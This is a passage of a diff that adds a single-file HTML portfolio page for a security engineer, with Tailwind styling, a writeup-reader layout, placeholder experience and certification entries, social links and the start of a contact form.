@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+<!--
+  ============================================================================
+  Tania I. Ortiz — Personal Portfolio (single-file SPA)
+  ----------------------------------------------------------------------------
+  Stack: semantic HTML + Tailwind CSS (CDN) + vanilla JS. Dark theme only.
+
+  HOW TO CUSTOMISE
+  ----------------
+  1. Search for  [[  to find every placeholder that still needs your input
+     (experience entries, certifications, projects, resume file).
+  2. Drop your resume PDF at  assets/Tania-Ortiz-Resume.pdf  (or change the
+     RESUME_URL constant in the CONFIG block below).
+  3. Writeups live in the  WRITEUPS  array near the bottom of the <script>.
+     Each `body` is an HTML string rendered in the Mintlify-style reader.
+  4. Deploy: it's a static file. GitHub Pages / Netlify / Cloudflare Pages all
+     work with zero config — just serve index.html.
+  ============================================================================
+-->
+<html lang="en" class="dark scroll-smooth">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Tania I. Ortiz — Security Engineer</title>
+<meta name="description" content="Tania I. Ortiz — security engineering, networking, IT infrastructure, and AML. Labs, CTFs, custom tooling, and POCs." />
+<meta name="author" content="Tania I. Ortiz" />
+
+<!-- Open Graph -->
+<meta property="og:title" content="Tania I. Ortiz — Security Engineer" />
+<meta property="og:description" content="The mindset of an analyst, the abilities of an engineer." />
+<meta property="og:type" content="website" />
+
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&family=Press+Start+2P&display=swap" rel="stylesheet" />
+
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+  tailwind.config = {
+    darkMode: 'class',
+    theme: {
+      extend: {
+        colors: {
+          ink:    { 950: '#08090a', 900: '#0d0f11', 850: '#121417', 800: '#181b1f' },
+          accent: {
+            300: '#5eead4',
+            400: '#2dd4bf',
+            500: '#14b8a6',
+            600: '#0d9488',
+          },
+        },
+        fontFamily: {
+          sans: ['Inter', 'ui-sans-serif', 'system-ui', 'sans-serif'],
+          mono: ['"JetBrains Mono"', 'ui-monospace', 'SFMono-Regular', 'monospace'],
+        },
+      },
+    },
+  };
+</script>
+
+<style>
+  :root { color-scheme: dark; }
+  html { scroll-behavior: smooth; }
+  body { background-color: #08090a; }
+
+  /* Fixed-nav offset for anchor jumps */
+  section[id] { scroll-margin-top: 5.5rem; }
+
+  ::selection { background: rgba(45, 212, 191, 0.28); }
+
+  /* Custom scrollbar */
+  ::-webkit-scrollbar { width: 10px; height: 10px; }
+  ::-webkit-scrollbar-track { background: #0d0f11; }
+  ::-webkit-scrollbar-thumb { background: #26292e; border-radius: 6px; border: 2px solid #0d0f11; }
+  ::-webkit-scrollbar-thumb:hover { background: #34383e; }
+
+  /* Hero backdrop: subtle grid + radial glow */
+  .hero-grid {
+    background-image:
+      linear-gradient(rgba(255,255,255,0.035) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,0.035) 1px, transparent 1px);
+    background-size: 56px 56px;
+    -webkit-mask-image: radial-gradient(ellipse 70% 60% at 50% 35%, #000 40%, transparent 100%);
+            mask-image: radial-gradient(ellipse 70% 60% at 50% 35%, #000 40%, transparent 100%);
+  }
+  .hero-glow {
+    background: radial-gradient(600px circle at 50% 0%, rgba(20,184,166,0.14), transparent 60%);
+  }
+
+  /* Scroll-reveal */
+  .reveal { opacity: 0; transform: translateY(18px); transition: opacity .6s cubic-bezier(.2,.6,.2,1), transform .6s cubic-bezier(.2,.6,.2,1); }
+  .reveal.in { opacity: 1; transform: none; }
+  @media (prefers-reduced-motion: reduce) {
+    .reveal { opacity: 1 !important; transform: none !important; transition: none; }
+    html { scroll-behavior: auto; }
+  }
+
+  /* Timeline */
+  .tl-item::before {
+    content: ""; position: absolute; left: -2.05rem; top: 0.35rem;
+    width: 0.75rem; height: 0.75rem; border-radius: 9999px;
+    background: #2dd4bf; box-shadow: 0 0 0 4px rgba(45,212,191,0.15);
+  }
+
+  /* ---------- Mintlify-style writeup reader ---------- */
+  .doc-reader { scrollbar-gutter: stable; }
+
+  .prose-doc { color: #c9ced6; font-size: 0.975rem; line-height: 1.75; }
+  .prose-doc > *:first-child { margin-top: 0; }
+  .prose-doc h2 {
+    color: #f4f6f8; font-weight: 700; font-size: 1.5rem; line-height: 1.3;
+    margin: 2.75rem 0 1rem; padding-top: 0.5rem; scroll-margin-top: 6rem;
+    border-top: 1px solid rgba(255,255,255,0.07);
+  }
+  .prose-doc h2:first-of-type { border-top: 0; margin-top: 0.5rem; }
+  .prose-doc h3 {
+    color: #eef1f4; font-weight: 600; font-size: 1.15rem;
+    margin: 2rem 0 0.75rem; scroll-margin-top: 6rem;
+  }
+  .prose-doc p { margin: 1rem 0; }
+  .prose-doc a { color: #2dd4bf; text-decoration: none; border-bottom: 1px solid rgba(45,212,191,0.4); }
+  .prose-doc a:hover { border-bottom-color: #2dd4bf; }
+  .prose-doc ul, .prose-doc ol { margin: 1rem 0; padding-left: 1.4rem; }
+  .prose-doc li { margin: 0.4rem 0; }
+  .prose-doc ul > li { list-style: disc; }
+  .prose-doc ol > li { list-style: decimal; }
+  .prose-doc strong { color: #eef1f4; font-weight: 650; }
+  .prose-doc code {
+    font-family: "JetBrains Mono", ui-monospace, monospace; font-size: 0.85em;
+    background: rgba(255,255,255,0.07); border: 1px solid rgba(255,255,255,0.08);
+    padding: 0.12em 0.4em; border-radius: 5px; color: #e6e9ee;
+  }
+  .prose-doc pre {
+    position: relative; margin: 1.25rem 0; padding: 1rem 1.1rem; overflow-x: auto;
+    background: #0b0d0f; border: 1px solid rgba(255,255,255,0.09); border-radius: 12px;
+    font-family: "JetBrains Mono", ui-monospace, monospace; font-size: 0.83rem; line-height: 1.6;
+  }
+  .prose-doc pre code { background: none; border: 0; padding: 0; color: #cdd3da; font-size: inherit; }
+  .prose-doc pre .cmt { color: #6b7280; }
+  .prose-doc pre .tok { color: #2dd4bf; }
+  .prose-doc table { width: 100%; margin: 1.25rem 0; border-collapse: collapse; font-size: 0.9rem; display: block; overflow-x: auto; }
+  .prose-doc th, .prose-doc td { text-align: left; padding: 0.6rem 0.9rem; border: 1px solid rgba(255,255,255,0.09); }
+  .prose-doc th { background: rgba(255,255,255,0.04); color: #eef1f4; font-weight: 600; }
+  .prose-doc blockquote { margin: 1.25rem 0; padding: 0.25rem 0 0.25rem 1rem; border-left: 3px solid #2dd4bf; color: #aeb4bd; }
+  .prose-doc hr { border: 0; border-top: 1px solid rgba(255,255,255,0.08); margin: 2rem 0; }
+
+  .callout {
+    display: flex; gap: 0.75rem; margin: 1.25rem 0; padding: 0.9rem 1rem;
+    border-radius: 12px; border: 1px solid; font-size: 0.9rem; line-height: 1.65;
+  }
+  .callout .ic { flex: none; width: 1.15rem; height: 1.15rem; margin-top: 0.15rem; }
+  .callout p { margin: 0; }
+  .callout-info    { background: rgba(45,212,191,0.07);  border-color: rgba(45,212,191,0.28);  color: #bfeee7; }
+  .callout-warn    { background: rgba(245,158,11,0.08);   border-color: rgba(245,158,11,0.30);  color: #f4d9a8; }
+  .callout-success { background: rgba(34,197,94,0.08);    border-color: rgba(34,197,94,0.30);   color: #b7e9c4; }
+  .callout-danger  { background: rgba(239,68,68,0.08);    border-color: rgba(239,68,68,0.30);   color: #f2c0c0; }
+
+  .copy-btn {
+    position: absolute; top: 0.5rem; right: 0.5rem; padding: 0.3rem 0.55rem;
+    font-size: 0.7rem; font-family: "JetBrains Mono", monospace; letter-spacing: 0.03em;
+    color: #9aa1ab; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.12);
+    border-radius: 7px; cursor: pointer; opacity: 0; transition: opacity .15s, color .15s, border-color .15s;
+  }
+  .prose-doc pre:hover .copy-btn { opacity: 1; }
+  .copy-btn:hover { color: #2dd4bf; border-color: rgba(45,212,191,0.5); }
+  .copy-btn.done { color: #2dd4bf; }
+
+  .toc-link { display: block; padding: 0.28rem 0; color: #8b929c; font-size: 0.85rem; border-left: 2px solid transparent; padding-left: 0.85rem; margin-left: -0.85rem; transition: color .15s, border-color .15s; }
+  .toc-link:hover { color: #d7dbe0; }
+  .toc-link.sub { padding-left: 1.7rem; font-size: 0.82rem; }
+  .toc-link.active { color: #2dd4bf; border-left-color: #2dd4bf; }
+</style>
+</head>
+
+<body class="bg-ink-950 font-sans text-zinc-300 antialiased">
+
+<!-- ══════════════════════ NAV ══════════════════════ -->
+<header id="nav" class="fixed inset-x-0 top-0 z-40 border-b border-white/5 bg-ink-950/70 backdrop-blur-lg transition-shadow">
+  <nav class="mx-auto flex h-16 max-w-6xl items-center justify-between px-5 sm:px-8">
+    <a href="#home" class="group flex items-center gap-2.5 font-semibold text-zinc-100">
+      <span class="grid h-8 w-8 place-items-center rounded-lg border border-accent-400/30 bg-accent-400/10 font-mono text-sm text-accent-400 transition group-hover:bg-accent-400/20">to</span>
+      <span class="hidden sm:block">Tania&nbsp;I.&nbsp;Ortiz</span>
+    </a>
+
+    <div class="hidden items-center gap-1 md:flex">
+      <a href="#experience" class="nav-link rounded-md px-3 py-2 text-sm text-zinc-400 transition hover:text-zinc-100" data-target="experience">Experience</a>
+      <a href="#projects"   class="nav-link rounded-md px-3 py-2 text-sm text-zinc-400 transition hover:text-zinc-100" data-target="projects">Projects</a>
+      <a href="#writeups"   class="nav-link rounded-md px-3 py-2 text-sm text-zinc-400 transition hover:text-zinc-100" data-target="writeups">Writeups</a>
+      <a href="#contact"    class="nav-link rounded-md px-3 py-2 text-sm text-zinc-400 transition hover:text-zinc-100" data-target="contact">Contact</a>
+      <a href="assets/Tania-Ortiz-Resume.pdf" download class="ml-2 inline-flex items-center gap-1.5 rounded-md border border-accent-400/40 bg-accent-400/10 px-3 py-2 text-sm font-medium text-accent-400 transition hover:bg-accent-400/20">
+        <svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12m0 0 4-4m-4 4-4-4M4 17v2a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-2"/></svg>
+        Resume
+      </a>
+    </div>
+
+    <button id="menuBtn" aria-label="Open menu" aria-expanded="false" class="rounded-md p-2 text-zinc-300 transition hover:bg-white/5 md:hidden">
+      <svg class="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 6h16M4 12h16M4 18h16"/></svg>
+    </button>
+  </nav>
+
+  <!-- Mobile menu -->
+  <div id="mobileMenu" class="hidden border-t border-white/5 bg-ink-950/95 px-5 py-3 md:hidden">
+    <a href="#experience" class="block rounded-md px-3 py-2.5 text-sm text-zinc-300 hover:bg-white/5">Experience &amp; Certifications</a>
+    <a href="#projects"   class="block rounded-md px-3 py-2.5 text-sm text-zinc-300 hover:bg-white/5">Featured Projects</a>
+    <a href="#writeups"   class="block rounded-md px-3 py-2.5 text-sm text-zinc-300 hover:bg-white/5">Writeups</a>
+    <a href="#contact"    class="block rounded-md px-3 py-2.5 text-sm text-zinc-300 hover:bg-white/5">Contact</a>
+    <a href="assets/Tania-Ortiz-Resume.pdf" download class="mt-1 block rounded-md bg-accent-400/10 px-3 py-2.5 text-sm font-medium text-accent-400">Download Resume ↓</a>
+  </div>
+</header>
+
+<main>
+  <!-- ══════════════════════ HERO ══════════════════════ -->
+  <section id="home" class="relative overflow-hidden pt-32 pb-24 sm:pt-40 sm:pb-32">
+    <div class="pointer-events-none absolute inset-0 hero-grid"></div>
+    <div class="pointer-events-none absolute inset-0 hero-glow"></div>
+
+    <div class="relative mx-auto max-w-4xl px-5 text-center sm:px-8">
+      <p class="reveal mb-5 inline-flex items-center gap-2 rounded-full border border-white/10 bg-white/5 px-3.5 py-1.5 text-xs font-medium text-zinc-400">
+        <span class="relative flex h-2 w-2"><span class="absolute inline-flex h-full w-full animate-ping rounded-full bg-accent-400 opacity-75"></span><span class="relative inline-flex h-2 w-2 rounded-full bg-accent-400"></span></span>
+        Security engineering &nbsp;·&nbsp; open to opportunities
+      </p>
+
+      <h1 class="reveal text-balance text-4xl font-extrabold leading-[1.1] tracking-tight text-zinc-50 sm:text-6xl">
+        The mindset of an analyst,<br class="hidden sm:block" />
+        the abilities of an <span class="bg-gradient-to-r from-accent-400 to-teal-300 bg-clip-text text-transparent">engineer</span>.
+      </h1>
+
+      <p class="reveal mx-auto mt-6 max-w-2xl text-pretty text-base leading-relaxed text-zinc-400 sm:text-lg">
+        I'm moving into security engineering from a business background, with nearly three years of
+        hands-on experience spanning <span class="text-zinc-200">security engineering</span>,
+        <span class="text-zinc-200">networking</span>, <span class="text-zinc-200">IT infrastructure</span>,
+        <span class="text-zinc-200">analytical roles at education and research institutes</span>, and
+        <span class="text-zinc-200">anti-money-laundering</span>. I got here by deliberately taking on the problems
+        that pushed me outside my comfort zone — and I document what I learn along the way.
+      </p>
+
+      <div class="reveal mt-9 flex flex-wrap items-center justify-center gap-3">
+        <a href="#projects" class="inline-flex items-center gap-2 rounded-lg bg-accent-400 px-5 py-3 text-sm font-semibold text-ink-950 transition hover:bg-accent-300">
+          View my work
+        </a>
+        <a href="assets/Tania-Ortiz-Resume.pdf" download class="inline-flex items-center gap-2 rounded-lg border border-white/15 bg-white/5 px-5 py-3 text-sm font-semibold text-zinc-100 transition hover:bg-white/10">
+          <svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12m0 0 4-4m-4 4-4-4M4 17v2a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-2"/></svg>
+          Download résumé
+        </a>
+      </div>
+
+      <!-- Social links -->
+      <div class="reveal mt-10 flex items-center justify-center gap-1">
+        <a href="https://github.com/by-tayo" target="_blank" rel="noopener" aria-label="GitHub" class="group rounded-lg p-2.5 text-zinc-500 transition hover:bg-white/5 hover:text-zinc-100">
+          <svg class="h-5 w-5" viewBox="0 0 24 24" fill="currentColor"><path d="M12 .5A11.5 11.5 0 0 0 .5 12a11.5 11.5 0 0 0 7.86 10.92c.58.1.79-.25.79-.56v-2c-3.2.7-3.88-1.37-3.88-1.37-.53-1.34-1.3-1.7-1.3-1.7-1.05-.72.08-.71.08-.71 1.17.08 1.79 1.2 1.79 1.2 1.03 1.77 2.7 1.26 3.36.96.1-.75.4-1.26.73-1.55-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.19-3.1-.12-.29-.52-1.46.11-3.05 0 0 .97-.31 3.18 1.18a11 11 0 0 1 5.8 0c2.2-1.49 3.17-1.18 3.17-1.18.63 1.59.23 2.76.11 3.05.74.81 1.19 1.84 1.19 3.1 0 4.43-2.7 5.4-5.27 5.69.41.36.77 1.05.77 2.12v3.14c0 .31.21.67.8.56A11.5 11.5 0 0 0 23.5 12 11.5 11.5 0 0 0 12 .5Z"/></svg>
+        </a>
+        <a href="https://www.linkedin.com/in/tania--ortiz/" target="_blank" rel="noopener" aria-label="LinkedIn" class="group rounded-lg p-2.5 text-zinc-500 transition hover:bg-white/5 hover:text-zinc-100">
+          <svg class="h-5 w-5" viewBox="0 0 24 24" fill="currentColor"><path d="M20.45 20.45h-3.56v-5.57c0-1.33-.02-3.04-1.85-3.04-1.86 0-2.14 1.45-2.14 2.94v5.67H9.35V9h3.41v1.56h.05c.48-.9 1.63-1.85 3.36-1.85 3.6 0 4.27 2.37 4.27 5.45v6.24ZM5.34 7.43a2.07 2.07 0 1 1 0-4.14 2.07 2.07 0 0 1 0 4.14ZM7.12 20.45H3.55V9h3.57v11.45ZM22.22 0H1.77C.8 0 0 .78 0 1.75v20.5C0 23.22.8 24 1.77 24h20.45c.98 0 1.78-.78 1.78-1.75V1.75C24 .78 23.2 0 22.22 0Z"/></svg>
+        </a>
+        <a href="https://medium.com/@bytayo" target="_blank" rel="noopener" aria-label="Medium" class="group rounded-lg p-2.5 text-zinc-500 transition hover:bg-white/5 hover:text-zinc-100">
+          <svg class="h-5 w-5" viewBox="0 0 24 24" fill="currentColor"><path d="M13.54 12a6.8 6.8 0 0 1-6.77 6.82A6.8 6.8 0 0 1 0 12a6.8 6.8 0 0 1 6.77-6.82A6.8 6.8 0 0 1 13.54 12Zm7.42 0c0 3.54-1.51 6.42-3.38 6.42-1.86 0-3.38-2.88-3.38-6.42s1.52-6.42 3.38-6.42S20.96 8.46 20.96 12ZM24 12c0 3.17-.53 5.75-1.19 5.75-.66 0-1.19-2.58-1.19-5.75s.53-5.75 1.19-5.75C23.47 6.25 24 8.83 24 12Z"/></svg>
+        </a>
+        <a href="https://tayeotan.substack.com/" target="_blank" rel="noopener" aria-label="Substack" class="group rounded-lg p-2.5 text-zinc-500 transition hover:bg-white/5 hover:text-zinc-100">
+          <svg class="h-5 w-5" viewBox="0 0 24 24" fill="currentColor"><path d="M22.54 8.52H1.46V5.6h21.08v2.92ZM1.46 11.08H22.54V24l-10.54-5.9L1.46 24V11.08ZM22.54 2.92H1.46V0h21.08v2.92Z"/></svg>
+        </a>
+        <a href="mailto:taniaiortiz@protonmail.com" aria-label="Email" class="group rounded-lg p-2.5 text-zinc-500 transition hover:bg-white/5 hover:text-zinc-100">
+          <svg class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  <!-- ══════════════════════ EXPERIENCE & CERTIFICATIONS ══════════════════════ -->
+  <section id="experience" class="border-t border-white/5 py-20 sm:py-28">
+    <div class="mx-auto max-w-5xl px-5 sm:px-8">
+      <header class="reveal mb-14 max-w-2xl">
+        <p class="mb-2 font-mono text-xs uppercase tracking-[0.2em] text-accent-400">01 — Background</p>
+        <h2 class="text-3xl font-bold tracking-tight text-zinc-50 sm:text-4xl">Experience &amp; Certifications</h2>
+        <p class="mt-3 text-zinc-400">A chronological look at the roles and credentials behind the work.</p>
+      </header>
+
+      <div class="grid gap-14 lg:grid-cols-[1.5fr_1fr]">
+        <!-- Timeline -->
+        <ol class="relative ml-8 border-l border-white/10">
+          <!-- [[ EDIT: one <li> per role, newest first. ]] -->
+          <li class="tl-item reveal relative mb-10 pl-8">
+            <div class="flex flex-wrap items-baseline justify-between gap-x-3">
+              <h3 class="text-lg font-semibold text-zinc-100">[[Security Engineer]]</h3>
+              <span class="font-mono text-xs text-zinc-500">[[2024]] — Present</span>
+            </div>
+            <p class="text-sm font-medium text-accent-400">[[Company / Organization]]</p>
+            <p class="mt-2 text-sm leading-relaxed text-zinc-400">
+              [[Two lines on scope and impact — e.g. detection engineering, hardening,
+              incident response, tooling you built, and a measurable result.]]
+            </p>
+            <div class="mt-3 flex flex-wrap gap-1.5">
+              <span class="rounded border border-white/10 bg-white/5 px-2 py-0.5 font-mono text-[11px] text-zinc-400">[[SIEM]]</span>
+              <span class="rounded border border-white/10 bg-white/5 px-2 py-0.5 font-mono text-[11px] text-zinc-400">[[Python]]</span>
+              <span class="rounded border border-white/10 bg-white/5 px-2 py-0.5 font-mono text-[11px] text-zinc-400">[[Cloud]]</span>
+            </div>
+          </li>
+
+          <li class="tl-item reveal relative mb-10 pl-8">
+            <div class="flex flex-wrap items-baseline justify-between gap-x-3">
+              <h3 class="text-lg font-semibold text-zinc-100">[[IT Infrastructure Analyst]]</h3>
+              <span class="font-mono text-xs text-zinc-500">[[2023]] — [[2024]]</span>
+            </div>
+            <p class="text-sm font-medium text-accent-400">[[Company / Organization]]</p>
+            <p class="mt-2 text-sm leading-relaxed text-zinc-400">
+              [[Networking, endpoint management, identity, on-call — what you owned and improved.]]
+            </p>
+            <div class="mt-3 flex flex-wrap gap-1.5">
+              <span class="rounded border border-white/10 bg-white/5 px-2 py-0.5 font-mono text-[11px] text-zinc-400">[[Active Directory]]</span>
+              <span class="rounded border border-white/10 bg-white/5 px-2 py-0.5 font-mono text-[11px] text-zinc-400">[[Networking]]</span>
+            </div>
+          </li>
+
+          <li class="tl-item reveal relative pl-8">
+            <div class="flex flex-wrap items-baseline justify-between gap-x-3">
+              <h3 class="text-lg font-semibold text-zinc-100">[[AML Analyst]]</h3>
+              <span class="font-mono text-xs text-zinc-500">[[2022]] — [[2023]]</span>
+            </div>
+            <p class="text-sm font-medium text-accent-400">[[Company / Organization]]</p>
+            <p class="mt-2 text-sm leading-relaxed text-zinc-400">
+              [[Transaction monitoring, investigations, SAR narratives — and how it built your
+              analytical instincts.]]
+            </p>
+            <div class="mt-3 flex flex-wrap gap-1.5">
+              <span class="rounded border border-white/10 bg-white/5 px-2 py-0.5 font-mono text-[11px] text-zinc-400">[[Transaction Monitoring]]</span>
+              <span class="rounded border border-white/10 bg-white/5 px-2 py-0.5 font-mono text-[11px] text-zinc-400">[[SQL]]</span>
+            </div>
+          </li>
+        </ol>
+
+        <!-- Certifications -->
+        <div class="reveal">
+          <h3 class="mb-4 text-sm font-semibold uppercase tracking-wider text-zinc-500">Certifications</h3>
+          <ul class="space-y-3">
+            <!-- [[ EDIT: name | issuer | date/status ]] -->
+            <li class="rounded-xl border border-white/10 bg-ink-900/60 p-4">
+              <div class="flex items-start justify-between gap-3">
+                <div>
+                  <p class="font-medium text-zinc-100">[[CompTIA Security+]]</p>
+                  <p class="text-xs text-zinc-500">[[CompTIA]]</p>
+                </div>
+                <span class="rounded-full bg-accent-400/10 px-2 py-0.5 text-[11px] font-medium text-accent-400">[[2024]]</span>
+              </div>
+            </li>
+            <li class="rounded-xl border border-white/10 bg-ink-900/60 p-4">
+              <div class="flex items-start justify-between gap-3">
+                <div>
+                  <p class="font-medium text-zinc-100">[[CompTIA Network+]]</p>
+                  <p class="text-xs text-zinc-500">[[CompTIA]]</p>
+                </div>
+                <span class="rounded-full bg-accent-400/10 px-2 py-0.5 text-[11px] font-medium text-accent-400">[[2023]]</span>
+              </div>
+            </li>
+            <li class="rounded-xl border border-white/10 bg-ink-900/60 p-4">
+              <div class="flex items-start justify-between gap-3">
+                <div>
+                  <p class="font-medium text-zinc-100">[[CySA+ / Blue Team Level 1]]</p>
+                  <p class="text-xs text-zinc-500">[[Issuer]]</p>
+                </div>
+                <span class="rounded-full bg-amber-400/10 px-2 py-0.5 text-[11px] font-medium text-amber-300">In progress</span>
+              </div>
+            </li>
+          </ul>
+
+          <div class="mt-6 rounded-xl border border-white/10 bg-ink-900/60 p-4">
+            <h3 class="mb-2 text-sm font-semibold uppercase tracking-wider text-zinc-500">Also writing on</h3>
+            <div class="space-y-2 text-sm">
+              <a href="https://medium.com/@bytayo" target="_blank" rel="noopener" class="flex items-center justify-between text-zinc-300 hover:text-accent-400">
+                <span>Medium — productivity &amp; workflow</span><span aria-hidden="true">↗</span>
+              </a>
+              <a href="https://tayeotan.substack.com/" target="_blank" rel="noopener" class="flex items-center justify-between text-zinc-300 hover:text-accent-400">
+                <span>Substack — theory, workflows, diagrams</span><span aria-hidden="true">↗</span>
+              </a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ══════════════════════ FEATURED PROJECTS ══════════════════════ -->
+  <section id="projects" class="border-t border-white/5 py-20 sm:py-28">
+    <div class="mx-auto max-w-6xl px-5 sm:px-8">
+      <header class="reveal mb-14 max-w-2xl">
+        <p class="mb-2 font-mono text-xs uppercase tracking-[0.2em] text-accent-400">02 — Selected work</p>
+        <h2 class="text-3xl font-bold tracking-tight text-zinc-50 sm:text-4xl">Featured Projects</h2>
+        <p class="mt-3 text-zinc-400">Each card: what it does, how it's built, and where to dig in.</p>
+      </header>
+
+      <div id="projectGrid" class="grid gap-5 sm:grid-cols-2">
+        <!-- Cards injected by JS from the PROJECTS array -->
+      </div>
+    </div>
+  </section>
+
+  <!-- ══════════════════════ WRITEUPS (Mintlify-style) ══════════════════════ -->
+  <section id="writeups" class="border-t border-white/5 py-20 sm:py-28">
+    <div class="mx-auto max-w-6xl px-5 sm:px-8">
+      <header class="reveal mb-6 max-w-2xl">
+        <p class="mb-2 font-mono text-xs uppercase tracking-[0.2em] text-accent-400">03 — Deep dives</p>
+        <h2 class="text-3xl font-bold tracking-tight text-zinc-50 sm:text-4xl">Writeups</h2>
+        <p class="mt-3 text-zinc-400">
+          Full-depth labs, CTFs, custom tooling, and POCs — rendered in a docs-style reader.
+          Lighter productivity notes live on <a href="https://medium.com/@bytayo" target="_blank" rel="noopener" class="text-accent-400 hover:underline">Medium</a>;
+          theory and workflow diagrams on <a href="https://tayeotan.substack.com/" target="_blank" rel="noopener" class="text-accent-400 hover:underline">Substack</a>.
+        </p>
+      </header>
+
+      <div class="reveal mb-8 flex flex-wrap gap-2" id="writeupFilters"></div>
+
+      <div id="writeupGrid" class="grid gap-5 sm:grid-cols-2 lg:grid-cols-3">
+        <!-- Cards injected by JS from the WRITEUPS array -->
+      </div>
+    </div>
+  </section>
+
+  <!-- ══════════════════════ CONTACT ══════════════════════ -->
+  <section id="contact" class="border-t border-white/5 py-20 sm:py-28">
+    <div class="mx-auto max-w-5xl px-5 sm:px-8">
+      <div class="grid gap-12 lg:grid-cols-2">
+        <div class="reveal">
+          <p class="mb-2 font-mono text-xs uppercase tracking-[0.2em] text-accent-400">04 — Say hello</p>
+          <h2 class="text-3xl font-bold tracking-tight text-zinc-50 sm:text-4xl">Get in touch</h2>
+          <p class="mt-3 max-w-md text-zinc-400">
+            Open to security engineering roles, collaborations, and interesting problems.
+            The form drafts an email in your own mail client — nothing is sent through a third party.
+          </p>
+
+          <div class="mt-8 space-y-3">
+            <a href="mailto:taniaiortiz@protonmail.com" class="flex items-center gap-3 text-zinc-300 transition hover:text-accent-400">
+              <span class="grid h-9 w-9 place-items-center rounded-lg border border-white/10 bg-white/5">
+                <svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
+              </span>
+              taniaiortiz@protonmail.com
+            </a>
+            <a href="https://github.com/by-tayo" target="_blank" rel="noopener" class="flex items-center gap-3 text-zinc-300 transition hover:text-accent-400">
+              <span class="grid h-9 w-9 place-items-center rounded-lg border border-white/10 bg-white/5">
+                <svg class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor"><path d="M12 .5A11.5 11.5 0 0 0 .5 12a11.5 11.5 0 0 0 7.86 10.92c.58.1.79-.25.79-.56v-2c-3.2.7-3.88-1.37-3.88-1.37-.53-1.34-1.3-1.7-1.3-1.7-1.05-.72.08-.71.08-.71 1.17.08 1.79 1.2 1.79 1.2 1.03 1.77 2.7 1.26 3.36.96.1-.75.4-1.26.73-1.55-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.19-3.1-.12-.29-.52-1.46.11-3.05 0 0 .97-.31 3.18 1.18a11 11 0 0 1 5.8 0c2.2-1.49 3.17-1.18 3.17-1.18.63 1.59.23 2.76.11 3.05.74.81 1.19 1.84 1.19 3.1 0 4.43-2.7 5.4-5.27 5.69.41.36.77 1.05.77 2.12v3.14c0 .31.21.67.8.56A11.5 11.5 0 0 0 23.5 12 11.5 11.5 0 0 0 12 .5Z"/></svg>
+              </span>
+              github.com/by-tayo
+            </a>
+            <a href="https://www.linkedin.com/in/tania--ortiz/" target="_blank" rel="noopener" class="flex items-center gap-3 text-zinc-300 transition hover:text-accent-400">
+              <span class="grid h-9 w-9 place-items-center rounded-lg border border-white/10 bg-white/5">
+                <svg class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor"><path d="M20.45 20.45h-3.56v-5.57c0-1.33-.02-3.04-1.85-3.04-1.86 0-2.14 1.45-2.14 2.94v5.67H9.35V9h3.41v1.56h.05c.48-.9 1.63-1.85 3.36-1.85 3.6 0 4.27 2.37 4.27 5.45v6.24ZM5.34 7.43a2.07 2.07 0 1 1 0-4.14 2.07 2.07 0 0 1 0 4.14ZM7.12 20.45H3.55V9h3.57v11.45ZM22.22 0H1.77C.8 0 0 .78 0 1.75v20.5C0 23.22.8 24 1.77 24h20.45c.98 0 1.78-.78 1.78-1.75V1.75C24 .78 23.2 0 22.22 0Z"/></svg>
+              </span>
+              in/tania--ortiz
+            </a>
+          </div>
+        </div>
+
+        <form id="contactForm" class="reveal rounded-2xl border border-white/10 bg-ink-900/60 p-6 sm:p-8" novalidate>
+          <div class="grid gap-4 sm:grid-cols-2">
+            <label class="block">
+              <span class="mb-1.5 block text-sm font-medium text-zinc-300">Name</span>
+              <input name="name" type="text" required autocomplete="name"
+                class="w-full rounded-lg border border-white/10 bg-ink-950 px-3.5 py-2.5 text-sm text-zinc-100 outline-none transition placeholder:text-zinc-600 focus:border-accent-400/60 focus:ring-2 focus:ring-accent-400/20"
+                placeholder="Your name" />
+            </label>
+            <label class="block">
+              <span class="mb-1.5 block text-sm font-medium text-zinc-300">Email</span>
+              <input name="email" type="email" required autocomplete="email"
+                class="w-full rounded-lg border border-white/10 bg-ink-950 px-3.5 py-2.5 text-sm text-zinc-100 outline-none transition placeholder:text-zinc-600 focus:border-accent-400/60 focus:ring-2 focus:ring-accent-400/20"
+                placeholder="you@example.com" />
+            </label>
+          </div>
+          <label class="mt-4 block">
+            <span class="mb-1.5 block text-sm font-medium text-zinc-300">Subject</span>
+            <input name="subject" type="text"
+              class="w-full rounded-lg border border-white/10 bg-ink-950 px-3.5 py-2.5 text-sm text-zinc-100 outline-none transition placeholder:text-zinc-600 focus:border-accent-400/60 focus:ring-2 focus:ring-accent-400/20"
+              placeholder="What's this about?" />
+          </label>
